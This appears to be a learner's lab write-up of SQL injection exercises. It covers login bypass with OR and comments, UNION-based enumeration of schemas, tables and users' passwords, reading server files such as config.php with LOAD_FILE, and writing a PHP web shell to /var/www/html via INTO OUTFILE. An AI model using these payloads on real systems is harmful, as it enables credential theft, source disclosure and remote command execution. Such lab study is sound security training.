### **Subverting Query Logic**

Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?

1- See if it is vulnerable to sql injection 

We received an error so yes. 

2- Abuse the OR operator.   

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image.png)

This query return all users. 

3- This does not mean we are logged in as tom. We are logged in as admin. 

**SELECT * FROM logins WHERE username='tom' OR '1' AND password = 'else';**

Since the AND operator will first be executed, and return false, then username tom exist so it return true. 

So the final is true. 

**Using Comments:**

Login as the user with the id 5 to get the flag.

Here the logic was to use a username that Iâ€™m sure will not be used. 

```sql
SELECT * FROM logins WHERE (username='ewefdde' OR id=5) -- ' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
                            
```

### Union Injection:

Use a Union injection to get the result of 'user()'

1- Test if vulnerable from injection

2- Now find the good amount of column. 

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%202.png)

Here we see that the number of column is not 3. 

4 is working so we have 4 tables. 

`cn' UNION SELECT 1,user(),3,4 -- -` 

This return the current user of the database. 

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%203.png)

Find information on the database:

Assume it is my sql.

1- Find the number of column in the search querie.

Here is it 4. 

`cn ' UNION SELECT 1,2,3,4-- -`

2- Find the different database

```sql
cn' UNION SELECT 1,SCHEMA_NAME,2,3 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%204.png)

3- Find the table name in the ilfreight database:

```sql
cn' UNION SELECT 1,TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES where table_schema = 'ilfreight'-- -
```

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%205.png)

4- Find the column name in the table users

```sql
cn' UNION SELECT 1,COLUMN_NAME,2,3 FROM INFORMATION_SCHEMA.COLUMNS where table_name = 'users'-- 
```

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%206.png)

5- Retrieve the data

```sql
cn' UNION SELECT 1,username,password,2 FROM ilfreight.users -- -
```

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%207.png)

### READING FILE:

1- Find the user we are:

`CN' UNION SELECT 1,user(),3,4 -- -`

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%208.png)

2- Find what are our privilege

`CN' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -`

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%209.png)

3- Use the readFile() command to find info on the source code

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%2010.png)

From this php above we can see that the code include config.php 

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -`

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%2011.png)

Write the webshell:

1- Find the value of the `secure_file_priv` variable

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%2012.png)

The variable is empty which mean we have the permission to write everywhere

2- Find the web base directory 

`cn' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4-- -`

Do a `CTRL +U`

![image.png](Practice%2019e1099e6b5c800b9112c7e56016267d/image%2013.png)

Here we find that the web directory is `/var/www`

Writing to this directory did not find so i tried `/var/www/html`

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
